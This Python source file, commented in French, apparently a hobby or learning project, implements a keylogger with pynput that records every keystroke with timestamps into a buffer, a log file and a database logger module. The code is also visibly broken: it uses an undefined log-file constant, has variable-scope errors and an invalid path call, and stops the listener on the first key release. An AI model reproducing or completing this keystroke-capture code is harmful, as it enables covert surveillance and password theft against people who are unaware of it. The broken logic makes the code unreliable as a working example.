from pynput import keyboard

import threading #arrier plan

from datetime import datetime #horaire chaque frape

import os
import logger #pour la base de données

#───────────────────────── HOOKS SYSTEME ─────────────────────────

# ── CONFIGURATION ────────────────────────────────────────────

#LOG_FILE = "keylog.txt" #data teste 

#APPELER DATA
BUFFER_SIZE = 20 #attendre pour pas reouvrire a chaque foi sinon bug

# ── VARIABLES GLOBALES ───────────────────────────────────────
buffer = []

#__variables pour la base de données___________________________
last_timestamp = None
buffer_empty = getattr(logger, "buffer_empty", True)

lock = threading.Lock()

# ── FONCTIONS UTILITAIRES ────────────────────────────────────
def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"

def flush_buffer():
    if not buffer_empty:      #j'ai fais ca comme ca mais modifie pour juste attendre que ca ecrit dans la db pour pouvoire revider le buffer pour eviter les bugs
        with open(LOG_FILE, "a", encoding="utf-8") as f: #j'ai mis ca la car je peux que flushbuffer est la fonction primordiale pour faire marcher les autres
            f.write("".join(buffer))
            key_data = buffer.copy() # copie le buffer avant de le vider pour le reutiliser pour la db
            buffer_empty = True #indique si le buffer se vide pour reutiliser les données pour la db
        buffer.clear()#vide la liste aprés ecrit 
    return key_data

# ── CALLBACKS : LE CŒUR DU LISTENER ─────────────────────────
def onpress(key):
    timestamp = datetime.now().strftime("%H:%M:%S")
    key_str = format_key(key)
    if key_str is None: #si pas reconue
        return

# ── THREAD SAFETY ──────────────────────────────────────
    with lock:
        buffer.append(key_str) #pour eviter les donner corrompues
        last_timestamp = timestamp
    if len(buffer) >= BUFFER_SIZE:
        flush_buffer()
        print(f"[{timestamp}] Capturé : {key_str}")
def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] Touche ESC détectée — arrêt du listener.")

    with lock:
        if buffer:
            flush_buffer()
    return False

# ── CLASSE PRINCIPALE : KeyLogger ───────────────────────────
class KeyLogger:
    def __init__(self):
        self.listener = None 

        self.is_running = False

    def start(self):
        print("[*] Démarrage du listener...")
        print(f"[*] Logs écrits dans : {os.path.abspath()}")
        print("[*]ESC pour stop.\n")
        self.is_running = True

        self.listener = keyboard.Listener(
            on_press=onpress,
            on_release=on_release
        )

        self.listener.start()
        self.listener.join()

        self.is_running = False
        print("[*] arreté propre")

    def stop(self):
        if self.listener and self.is_running:
            self.listener.stop()

# ── POINT D'ENTRÉE (test standalone) ────────────────────────
if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()